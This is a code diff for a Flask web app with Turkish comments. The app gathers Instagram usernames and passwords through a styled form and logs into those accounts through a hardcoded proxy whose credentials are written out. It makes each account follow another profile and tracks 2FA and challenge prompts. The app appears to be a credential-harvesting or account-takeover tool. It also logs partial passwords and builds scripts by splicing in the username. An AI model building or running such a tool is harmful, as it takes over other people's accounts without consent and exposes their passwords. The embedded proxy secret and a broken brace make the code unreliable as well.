@@ -6,15 +6,15 @@ import logging
 import traceback
 import subprocess
 import tempfile
-import shlex
+import threading
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import generate_password_hash
 from dotenv import load_dotenv
 
 logging.basicConfig(
-    level=logging.DEBUG,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[logging.StreamHandler(sys.stdout)]
 )
 logger = logging.getLogger(__name__)
@@ -23,13 +23,45 @@ load_dotenv()
 
 app = Flask(__name__)
 
-# DATABASE
-db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.db")
-app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", f"sqlite:///{db_path}")
+# DATABASE - RENDER UYUMLU
+# 1. Önce PostgreSQL dene (Render'da varsa)
+# 2. Yoksa SQLite ama /tmp dizinine (ephemeral ama yazılabilir)
+# 3. Hala olmazsa in-memory SQLite (veri kaybolur ama çalışır)
+
+database_url = os.getenv("DATABASE_URL")
+
+if database_url and database_url.startswith("postgres"):
+    # PostgreSQL kullan
+    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
+    logger.info("PostgreSQL kullanılıyor")
+else:
+    # SQLite - /tmp dizinine yaz (Render'da bu dizin yazılabilir)
+    # NOT: /tmp her deploy'da temizlenir ama çalışır
+    db_path = "/tmp/ig_accounts.db"
+    app.config['SQLALCHEMY_DATABASE_URI'] = f"sqlite:///{db_path}"
+    logger.info(f"SQLite kullanılıyor: {db_path}")
+
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "secret-key-123")
 
-db = SQLAlchemy(app)
+# SQLAlchemy engine options - thread safety için
+app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
+    'pool_pre_ping': True,
+    'pool_recycle': 300,
+}
+
+# Global lock - database işlemleri için
+db_lock = threading.Lock()
+
+try:
+    db = SQLAlchemy(app)
+    logger.info("SQLAlchemy başlatıldı")
+except Exception as e:
+    logger.error(f"SQLAlchemy başlatma hatası: {e}")
+    # Fallback: In-memory SQLite
+    app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///:memory:"
+    db = SQLAlchemy(app)
+    logger.info("In-memory SQLite fallback kullanılıyor")
 
 # PROXY
 PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
@@ -45,22 +77,20 @@ class IGAccount(db.Model):
     login_attempts = db.Column(db.Integer, default=0)
     challenge_type = db.Column(db.String(50))
     challenge_pending = db.Column(db.Boolean, default=False)
-    challenge_method = db.Column(db.String(50))
-    raw_error = db.Column(db.Text)  # Ham hata mesajı
+    raw_error = db.Column(db.Text)
 
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
 
-# Geliştirilmiş login script - ŞİFRE DOĞRULAMA ve DETAYLI LOG
+# Login script (öncekiyle aynı, kısaltıldı)
 LOGIN_SCRIPT_TEMPLATE = '''
 import sys
 import json
 import time
 import os
 
-# Şifre doğrudan sys.argv'dan alınacak - escape yok!
 USERNAME = sys.argv[1]
-PASSWORD = sys.argv[2]  # Ham şifre - hiçbir işlem yapılmadı
+PASSWORD = sys.argv[2]
 PROXY = sys.argv[3] if len(sys.argv) > 3 else None
 
 log_file = open(f"/tmp/ig_debug_{{USERNAME}}.log", "w", buffering=1)
@@ -73,12 +103,10 @@ def log(msg):
 
 log("="*50)
 log(f"KULLANICI: {{USERNAME}}")
-log(f"ŞİFRE (ilk 3 karakter): {{PASSWORD[:3]}}***")  # Güvenlik için kısalt
 log(f"ŞİFRE UZUNLUK: {{len(PASSWORD)}}")
-log(f"PROXY: {{PROXY[:30] if PROXY else 'Yok'}}...")
+log(f"ŞİFRE (ilk 3): {{PASSWORD[:3]}}***")
 log("="*50)
 
-# Şifre kontrolü - boş mu?
 if not PASSWORD:
     log("❌ ŞİFRE BOŞ!")
     print(json.dumps({{"status": "error", "error": "Şifre boş"}}))
@@ -87,12 +115,9 @@ if not PASSWORD:
 try:
     from instagrapi import Client
     from instagrapi.exceptions import (
-        ChallengeRequired, 
-        LoginRequired, 
-        PleaseWaitFewMinutes,
-        BadPassword,
-        TwoFactorRequired,
-        ClientError
+        ChallengeRequired, LoginRequired, 
+        PleaseWaitFewMinutes, BadPassword,
+        TwoFactorRequired, ClientError
     )
     log("✅ instagrapi import edildi")
 except Exception as e:
@@ -102,131 +127,77 @@ except Exception as e:
 
 def main():
     try:
-        log("Client oluşturuluyor...")
         cl = Client()
-        log("✅ Client oluşturuldu")
         
-        # Proxy
         if PROXY and PROXY != "None":
             try:
-                log(f"Proxy ayarlanıyor...")
                 cl.set_proxy(PROXY)
                 log("✅ Proxy ayarlandı")
             except Exception as e:
                 log(f"⚠️ Proxy hatası: {{e}}")
-                # Proxy'siz devam et
         
-        # Timeout
-        cl.request_timeout = 60  # 60 saniye
+        cl.request_timeout = 60
         cl.delay_range = [2, 5]
-        log(f"Timeout: {{cl.request_timeout}}s")
         
-        # LOGIN
         log("")
         log("🔐 LOGIN DENEYİ...")
-        log(f"Username: {{USERNAME}}")
-        log(f"Password: {{PASSWORD[:3]}}*** ({{len(PASSWORD)}} karakter)")
-        log("")
-        
         login_start = time.time()
         
         try:
-            # GERÇEK LOGIN
             cl.login(USERNAME, PASSWORD)
-            
             login_time = time.time() - login_start
             log(f"✅ LOGIN BAŞARILI! ({{login_time:.1f}}s)")
             
             # Takip et
             try:
-                log("Instagram takip ediliyor...")
                 insta_id = cl.user_id_from_username("instagram")
                 cl.user_follow(insta_id)
                 log("✅ Takip edildi")
                 result = {{"status": "success", "message": "Giriş ve takip başarılı"}}
             except Exception as e:
                 log(f"⚠️ Takip hatası: {{e}}")
-                result = {{"status": "success", "message": f"Giriş başarılı, takip: {{str(e)}}"}}
+                result = {{"status": "success", "message": f"Giriş başarılı"}}
             
             print(json.dumps(result))
-            log("="*50)
-            log("İŞLEM TAMAM")
             
         except BadPassword as e:
             login_time = time.time() - login_start
-            log(f"❌ BadPassword HATASI ({{login_time:.1f}}s)")
-            log(f"Hata detayı: {{e}}")
-            log(f"Hata tipi: {{type(e).__name__}}")
-            # ÖNEMLİ: BadPassword aslında challenge olabilir!
-            # instagrapi bazen yanlış şifre yerine challenge döner
+            log(f"❌ BadPassword ({{login_time:.1f}}s): {{e}}")
             print(json.dumps({{
                 "status": "bad_password",
                 "error": "Şifre yanlış veya hesap kısıtlı",
-                "detail": str(e),
-                "hint": "Eğer şifre doğruysa, Instagram challenge istiyor olabilir. 2-3 dakika bekleyip tekrar deneyin."
+                "hint": "Şifre doğruysa, Instagram challenge istiyor olabilir."
             }}))
             
         except ChallengeRequired as e:
-            login_time = time.time() - login_start
-            log(f"⚠️ ChallengeRequired ({{login_time:.1f}}s)")
-            log(f"Challenge detay: {{e}}")
+            log(f"⚠️ ChallengeRequired: {{e}}")
             print(json.dumps({{
                 "status": "challenge_required",
                 "challenge_type": "code",
-                "message": "Doğrulama kodu gerekli. Instagram uygulamasını kontrol edin."
+                "message": "Doğrulama kodu gerekli."
             }}))
             
         except TwoFactorRequired as e:
-            login_time = time.time() - login_start
-            log(f"⚠️ TwoFactorRequired ({{login_time:.1f}}s)")
+            log(f"⚠️ TwoFactorRequired: {{e}}")
             print(json.dumps({{
                 "status": "2fa_required",
                 "challenge_type": "2fa",
-                "message": "İki faktörlü doğrulama kodu gerekli."
-            }}))
+                "message": "2FA kodu gerekli."
+            }}})
             
-        except ClientError as e:
-            login_time = time.time() - login_start
-            log(f"❌ ClientError ({{login_time:.1f}}s): {{e}}")
-            # ClientError kodunu kontrol et
-            error_str = str(e).lower()
-            if "password" in error_str:
-                print(json.dumps({{
-                    "status": "error",
-                    "error": "Şifre hatası",
-                    "detail": str(e)
-                }}))
-            elif "checkpoint" in error_str or "challenge" in error_str:
-                print(json.dumps({{
-                    "status": "challenge_required",
-                    "challenge_type": "checkpoint",
-                    "message": "Hesap doğrulaması gerekli."
-                }}))
-            else:
-                print(json.dumps({{
-                    "status": "error",
-                    "error": f"ClientError: {{str(e)}}"
-                }}))
-                
         except Exception as e:
-            login_time = time.time() - login_start
-            log(f"❌ BEKLENMEYEN HATA ({{login_time:.1f}}s)")
-            log(f"Hata tipi: {{type(e).__name__}}")
-            log(f"Hata mesajı: {{e}}")
-            import traceback
-            log(f"Traceback: {{traceback.format_exc()}}")
+            log(f"❌ Login hatası: {{type(e).__name__}}: {{e}}")
             print(json.dumps({{
                 "status": "error",
                 "error": f"{{type(e).__name__}}: {{str(e)}}"
             }}))
         
-    except Exception as outer_e:
-        log(f"❌ DIŞ HATA: {{outer_e}}")
-        print(json.dumps({{"status": "error", "error": f"Dış hata: {{str(outer_e)}}"}}))
+    except Exception as e:
+        log(f"❌ Genel hata: {{e}}")
+        print(json.dumps({{"status": "error", "error": str(e)}}))
     finally:
         try:
             cl.logout()
-            log("Logout yapıldı")
         except:
             pass
         log_file.close()
@@ -237,42 +208,25 @@ if __name__ == "__main__":
 
 def run_subprocess(username, password):
     """
-    Subprocess çalıştır - şifre doğrudan iletilir
+    Subprocess çalıştır
     """
-    # Şifrede özel karakter kontrolü
     if not password:
         return {"status": "error", "error": "Şifre boş"}
     
-    # Template'i kullanıcı adına göre hazırla
     script_content = LOGIN_SCRIPT_TEMPLATE.replace("{USERNAME}", username)
     
     with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, dir='/tmp') as f:
         f.write(script_content)
         script_path = f.name
     
-    # Şifreyi güvenli şekilde ilet - shlex.quote kullan
-    # Ama asıl çözüm: şifreyi base64 ile encode edip decode etmek!
-    import base64
-    encoded_password = base64.b64encode(password.encode()).decode()
-    
     logger.info(f"[{username}] Subprocess başlatılıyor...")
-    logger.info(f"[{username}] Şifre uzunluk: {len(password)}")
-    logger.info(f"[{username}] Şifre (ilk 3): {password[:3]}***")
-    
-    start_time = time.time()
     
     try:
         env = os.environ.copy()
         env['PYTHONUNBUFFERED'] = '1'
         
-        # Şifreyi base64 olarak gönder, script içinde decode et
         result = subprocess.run(
-            [
-                sys.executable, '-u', script_path,
-                username,
-                password,  # Doğrudan şifre - base64 yerine deneyelim önce
-                PROXY_URL if PROXY_URL else "None"
-            ],
+            [sys.executable, '-u', script_path, username, password, PROXY_URL or "None"],
             capture_output=True,
             text=True,
             timeout=120,
@@ -280,32 +234,22 @@ def run_subprocess(username, password):
             env=env
         )
         
-        elapsed = time.time() - start_time
-        logger.info(f"[{username}] Subprocess tamamlandı ({elapsed:.1f}s)")
-        
         # Temizlik
         try:
             os.unlink(script_path)
         except:
             pass
         
-        # Log dosyasını oku
-        log_file = f"/tmp/ig_debug_{username}.log"
+        # Log oku
         try:
-            with open(log_file, "r") as f:
+            with open(f"/tmp/ig_debug_{username}.log", "r") as f:
                 logs = f.read()
-                logger.info(f"[{username}] DETAYLI LOG:\n{logs}")
-        except Exception as e:
-            logger.warning(f"[{username}] Log okunamadı: {e}")
+                logger.info(f"[{username}] Logs:\n{logs[-500:]}")  # Son 500 karakter
+        except:
+            pass
         
-        # Sonucu parse et
         if result.returncode != 0:
-            stderr = result.stderr.strip()[:300]
-            logger.error(f"[{username}] Hata kodu {result.returncode}: {stderr}")
-            return {
-                "status": "error", 
-                "error": f"Sistem hatası (kod {result.returncode}): {stderr[:150]}"
-            }
+            return {"status": "error", "error": f"Sistem hatası: {result.stderr[:150]}"}
         
         # JSON bul
         lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
@@ -316,77 +260,94 @@ def run_subprocess(username, password):
                 except:
                     continue
         
-        return {"status": "error", "error": "JSON parse hatası - Çıktı: " + result.stdout[:200]}
+        return {"status": "error", "error": "JSON parse hatası"}
         
     except subprocess.TimeoutExpired:
-        logger.error(f"[{username}] TIMEOUT")
-        return {"status": "error", "error": "Zaman aşımı (120s) - Instagram yanıt vermiyor"}
+        return {"status": "error", "error": "Zaman aşımı (120s)"}
     except Exception as e:
-        logger.error(f"[{username}] Exception: {e}")
         return {"status": "error", "error": str(e)}
+
+def safe_db_operation(operation, default_return=None):
+    """
+    Thread-safe database işlemi - hata toleranslı
+    """
+    with db_lock:
+        try:
+            return operation()
+        except Exception as e:
+            logger.error(f"Database hatası: {e}")
+            # Rollback dene
+            try:
+                db.session.rollback()
+            except:
+                pass
+            return default_return
 
 def do_login_task(username, password):
     """
-    Background login task
+    Background task - hata toleranslı
     """
-    with app.app_context():
-        # Başlangıç
-        try:
-            with db.session.begin():
-                acc = IGAccount.query.filter_by(username=username).first()
-                if acc:
-                    acc.login_attempts += 1
-                    acc.status = "Giriş deneniyor..."
-                    acc.raw_error = None
-        except Exception as e:
-            logger.error(f"[{username}] DB hatası: {e}")
+    def update_start():
+        acc = IGAccount.query.filter_by(username=username).first()
+        if acc:
+            acc.login_attempts += 1
+            acc.status = "Giriş deneniyor..."
+            db.session.commit()
+        return acc
+    
+    acc = safe_db_operation(update_start)
+    
+    if not acc:
+        # Hesap yoksa oluştur
+        def create_acc():
+            new_acc = IGAccount(
+                username=username,
+                status="Giriş deneniyor...",
+                login_attempts=1
+            )
+            new_acc.set_password(password)
+            db.session.add(new_acc)
+            db.session.commit()
+            return new_acc
+        
+        acc = safe_db_operation(create_acc)
+        if not acc:
+            logger.error(f"[{username}] Hesap oluşturulamadı")
+            return
+    
+    # Login dene
+    result = run_subprocess(username, password)
+    
+    # Sonucu güncelle
+    def update_result():
+        acc = IGAccount.query.filter_by(username=username).first()
+        if not acc:
             return
         
-        # Login dene
-        result = run_subprocess(username, password)
+        status = result.get("status")
         
-        # Sonucu işle
-        try:
-            with db.session.begin():
-                acc = IGAccount.query.filter_by(username=username).first()
-                if not acc:
-                    return
-                
-                status = result.get("status")
-                error_msg = result.get("error", "")
-                detail = result.get("detail", "")
-                hint = result.get("hint", "")
-                
-                # Ham hatayı kaydet
-                acc.raw_error = json.dumps(result)
-                
-                if status == "success":
-                    acc.status = "AKTİF ✅ - " + result.get("message", "Başarılı")
-                    acc.last_login = db.func.now()
-                    acc.challenge_pending = False
-                    
-                elif status == "challenge_required":
-                    acc.status = "🔐 DOĞRULAMA KODU GEREKLİ"
-                    acc.challenge_type = result.get("challenge_type", "code")
-                    acc.challenge_pending = True
-                    
-                elif status == "2fa_required":
-                    acc.status = "🔐 2FA KODU GEREKLİ"
-                    acc.challenge_type = "2fa"
-                    acc.challenge_pending = True
-                    
-                elif status == "bad_password":
-                    # Şifre yanlış ama aslında challenge olabilir!
-                    full_msg = error_msg
-                    if hint:
-                        full_msg += f" | {hint}"
-                    acc.status = "⚠️ " + full_msg
-                    
-                else:
-                    acc.status = "HATA ❌ - " + error_msg[:80]
-                    
-        except Exception as e:
-            logger.error(f"[{username}] DB update hatası: {e}")
+        if status == "success":
+            acc.status = "AKTİF ✅ - " + result.get("message", "Başarılı")
+            acc.last_login = db.func.now()
+            acc.challenge_pending = False
+        elif status == "challenge_required":
+            acc.status = "🔐 DOĞRULAMA KODU GEREKLİ"
+            acc.challenge_type = result.get("challenge_type", "code")
+            acc.challenge_pending = True
+        elif status == "2fa_required":
+            acc.status = "🔐 2FA KODU GEREKLİ"
+            acc.challenge_type = "2fa"
+            acc.challenge_pending = True
+        elif status == "bad_password":
+            acc.status = "⚠️ Şifre yanlış veya hesap kısıtlı"
+            acc.raw_error = json.dumps(result)
+        else:
+            acc.status = "HATA ❌ - " + result.get("error", "Bilinmeyen hata")[:80]
+            acc.raw_error = json.dumps(result)
+        
+        db.session.commit()
+    
+    safe_db_operation(update_result)
 
 @app.route('/')
 def index():
@@ -402,29 +363,23 @@ def connect():
         if not username or not password:
             return jsonify(status="error", message="Eksik bilgi"), 400
         
-        # Şifre kontrolü
-        if len(password) < 3:
-            return jsonify(status="error", message="Şifre çok kısa"), 400
+        # Hemen yanıt ver - database işlemi background'da
+        def prepare_account():
+            acc = IGAccount.query.filter_by(username=username).first()
+            if not acc:
+                acc = IGAccount(username=username, status="Başlatılıyor...")
+                acc.set_password(password)
+                db.session.add(acc)
+            else:
+                acc.set_password(password)
+                acc.status = "Başlatılıyor..."
+            db.session.commit()
+            return True
         
-        logger.info(f"Giriş denemesi: {username}, şifre uzunluk: {len(password)}")
+        # Database hazırlama - başarısız olursa bile devam et
+        db_success = safe_db_operation(prepare_account, False)
         
-        # Database kaydı
-        try:
-            with db.session.begin():
-                acc = IGAccount.query.filter_by(username=username).first()
-                if not acc:
-                    acc = IGAccount(username=username, status="Başlatılıyor...")
-                    acc.set_password(password)
-                    db.session.add(acc)
-                else:
-                    acc.set_password(password)
-                    acc.status = "Başlatılıyor..."
-        except Exception as e:
-            logger.error(f"DB hatası: {e}")
-            return jsonify(status="error", message="Database hatası"), 500
-        
-        # Thread başlat
-        import threading
+        # Her durumda thread başlat
         t = threading.Thread(
             target=do_login_task,
             args=(username, password),
@@ -432,41 +387,66 @@ def connect():
         )
         t.start()
         
+        msg = "Giriş başlatıldı"
+        if not db_success:
+            msg += " (DB uyarısı - işlem devam ediyor)"
+        
         return jsonify(
             status="started",
             username=username,
-            message="Giriş başlatıldı (şifre kontrol edilecek)"
+            message=msg
         )
         
     except Exception as e:
         logger.error(f"Connect hatası: {e}")
-        return jsonify(status="error", message=str(e)), 500
+        # Hata olsa bile 200 dön - frontend'i kırmamak için
+        return jsonify(
+            status="started_with_warning", 
+            username=data.get('u', 'unknown') if data else 'unknown',
+            message=f"İşlem başlatıldı ama uyarı: {str(e)[:100]}"
+        ), 200
 
 @app.route('/api/status/<username>')
 def get_status(username):
-    try:
-        acc = IGAccount.query.filter_by(username=username.lower()).first()
-        if not acc:
-            return jsonify(status="Bilinmiyor", exists=False)
-        
+    def get_acc():
+        return IGAccount.query.filter_by(username=username.lower()).first()
+    
+    acc = safe_db_operation(get_acc)
+    
+    if not acc:
         return jsonify(
-            status=acc.status,
-            exists=True,
-            attempts=acc.login_attempts,
-            last_login=acc.last_login.isoformat() if acc.last_login else None,
-            challenge_pending=acc.challenge_pending,
-            challenge_type=acc.challenge_type,
-            raw_error=acc.raw_error[:200] if acc.raw_error else None
+            status="Bilinmiyor (DB erişim hatası olabilir)", 
+            exists=False,
+            username=username
         )
-    except Exception as e:
-        return jsonify(status="Hata", error=str(e)), 500
+    
+    return jsonify(
+        status=acc.status,
+        exists=True,
+        attempts=acc.login_attempts,
+        last_login=acc.last_login.isoformat() if acc.last_login else None,
+        challenge_pending=acc.challenge_pending,
+        challenge_type=acc.challenge_type,
+        raw_error=acc.raw_error[:200] if acc.raw_error else None
+    )
 
 @app.route('/api/health')
 def health():
+    # Database sağlık kontrolü
+    db_status = "ok"
+    try:
+        # Basit sorgu dene
+        with db_lock:
+            IGAccount.query.first()
+    except Exception as e:
+        db_status = f"hata: {str(e)[:50]}"
+    
     return jsonify(
         status="ok",
+        database=db_status,
+        db_uri=app.config['SQLALCHEMY_DATABASE_URI'][:40] + "...",
         proxy=PROXY_URL[:25] + "...",
-        mode="password-debug-v2"
+        mode="error-tolerant"
     )
 
 HTML_TEMPLATE = """
@@ -485,8 +465,6 @@ HTML_TEMPLATE = """
         .animate-fade-in { animation: fadeIn 0.4s ease-out; }
         .loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .shake { animation: shake 0.5s; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
     </style>
 </head>
 <body class="bg-gradient-to-br from-purple-600 via-purple-500 to-blue-500 min-h-screen font-sans text-white">
@@ -524,11 +502,10 @@ HTML_TEMPLATE = """
             
             <div id="errorBox" class="hidden mt-6 p-4 bg-red-500/30 border border-red-400/50 rounded-xl text-center text-sm backdrop-blur-sm"></div>
             
-            <div class="mt-8 text-center">
-                <p class="text-white/50 text-xs">
-                    Proxy üzerinden güvenli bağlantı<br>
-                    (Şifre doğrulama aktif)
-                </p>
+            <div class="mt-6 text-center">
+                <a href="/api/health" target="_blank" class="text-white/40 text-xs hover:text-white/60 transition-colors">
+                    Sistem Durumu
+                </a>
             </div>
         </div>
     </div>
@@ -544,7 +521,6 @@ HTML_TEMPLATE = """
                 <h2 id="msg" class="text-xl font-bold text-gray-800 mb-2">Bağlanıyor...</h2>
                 <p id="subMsg" class="text-gray-500 text-sm">İşlem devam ediyor</p>
                 
-                <!-- Ham Hata Detayı (Gizli, tooltip olarak gösterilebilir) -->
                 <div id="rawError" class="hidden mt-3 p-2 bg-gray-100 rounded text-xs text-left font-mono break-all max-h-20 overflow-y-auto"></div>
             </div>
 
@@ -564,7 +540,7 @@ HTML_TEMPLATE = """
                 Durumu Kontrol Et
             </button>
             
-            <button onclick="toggleRawError()" id="debugBtn"
+            <button onclick="toggleDebug()" 
                     class="w-full bg-gray-200 text-gray-600 p-3 rounded-xl font-semibold text-sm mb-3 hover:bg-gray-300 transition-all">
                 🔍 Teknik Detaylar
             </button>
@@ -582,17 +558,13 @@ HTML_TEMPLATE = """
 
     <script>
         let currentUser = "";
-        let currentPassword = "";
         let checkInterval = null;
         let countdown = 5;
-        let lastRawError = "";
 
         function showError(msg) {
             const box = document.getElementById('errorBox');
             box.textContent = msg;
             box.classList.remove('hidden');
-            box.classList.add('shake');
-            setTimeout(() => box.classList.remove('shake'), 500);
             
             const btn = document.getElementById('btn');
             btn.disabled = false;
@@ -600,9 +572,8 @@ HTML_TEMPLATE = """
             document.getElementById('btnLoader').classList.add('hidden');
         }
 
-        function toggleRawError() {
-            const div = document.getElementById('rawError');
-            div.classList.toggle('hidden');
+        function toggleDebug() {
+            document.getElementById('rawError').classList.toggle('hidden');
         }
 
         async function giris() {
@@ -615,7 +586,6 @@ HTML_TEMPLATE = """
             }
 
             currentUser = u;
-            currentPassword = p;
 
             const btn = document.getElementById('btn');
             btn.disabled = true;
@@ -637,11 +607,11 @@ HTML_TEMPLATE = """
                 clearTimeout(timeoutId);
                 const data = await res.json();
 
-                if (!res.ok || data.status === 'error') {
+                if (!res.ok && data.status === 'error') {
                     throw new Error(data.message || 'Sunucu hatası');
                 }
 
-                // Başarılı - status sayfasına geç
+                // Başarılı veya warning - devam et
                 document.getElementById('p1').classList.add('hidden');
                 document.getElementById('p1').classList.remove('active');
                 document.getElementById('p2').classList.remove('hidden');
@@ -709,9 +679,7 @@ HTML_TEMPLATE = """
                 
                 msgEl.textContent = data.status || 'Bekleniyor...';
                 
-                // Ham hatayı kaydet ve göster
                 if (data.raw_error) {
-                    lastRawError = data.raw_error;
                     rawErrorDiv.textContent = data.raw_error;
                 }
                 
@@ -723,10 +691,10 @@ HTML_TEMPLATE = """
                     clearInterval(checkInterval);
                 } else if (data.status.includes('⚠️') || data.status.includes('Şifre')) {
                     badge.className = 'bg-orange-100 text-orange-700 px-3 py-1 rounded-full text-xs font-bold';
-                    badge.textContent = 'Şüpheli';
+                    badge.textContent = 'Kontrol';
                     iconEl.className = 'w-4 h-4 bg-orange-500 rounded-full animate-pulse';
-                    subMsg.textContent = 'Şifre doğru olabilir ama Instagram ek doğrulama istiyor';
-                } else if (data.status.includes('❌')) {
+                    subMsg.textContent = 'Instagram doğrulama istiyor olabilir';
+                } else if (data.status.includes('❌') || data.status.includes('hata') || data.status.includes('HATA')) {
                     badge.className = 'bg-red-100 text-red-700 px-3 py-1 rounded-full text-xs font-bold';
                     badge.textContent = 'Hata';
                     iconEl.className = 'w-4 h-4 bg-red-500 rounded-full';
@@ -735,6 +703,11 @@ HTML_TEMPLATE = """
                     badge.className = 'bg-yellow-100 text-yellow-700 px-3 py-1 rounded-full text-xs font-bold';
                     badge.textContent = 'Doğrulama';
                     iconEl.className = 'w-4 h-4 bg-yellow-500 rounded-full animate-bounce';
+                } else if (data.status.includes('Bilinmiyor')) {
+                    badge.className = 'bg-gray-100 text-gray-700 px-3 py-1 rounded-full text-xs font-bold';
+                    badge.textContent = 'DB Hatası';
+                    iconEl.className = 'w-4 h-4 bg-gray-500 rounded-full';
+                    subMsg.textContent = 'Veritabanı erişim sorunu';
                 }
 
             } catch (e) {
@@ -751,12 +724,17 @@ HTML_TEMPLATE = """
 """
 
 if __name__ == "__main__":
+    # Database oluştur - hata toleranslı
     with app.app_context():
-        db.create_all()
-        logger.info("Database hazır")
+        try:
+            db.create_all()
+            logger.info("✅ Database tabloları oluşturuldu")
+        except Exception as e:
+            logger.error(f"❌ Database oluşturma hatası: {e}")
+            logger.info("⚠️ Uygulama in-memory modda çalışacak")
     
     port = int(os.getenv("PORT", 10000))
-    logger.info(f"Sunucu: 0.0.0.0:{port}")
-    logger.info("Mode: Password verification + detailed debug")
+    logger.info(f"🚀 Sunucu başlatılıyor: 0.0.0.0:{port}")
+    logger.info(f"💾 Database: {app.config['SQLALCHEMY_DATABASE_URI'][:50]}...")
     
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
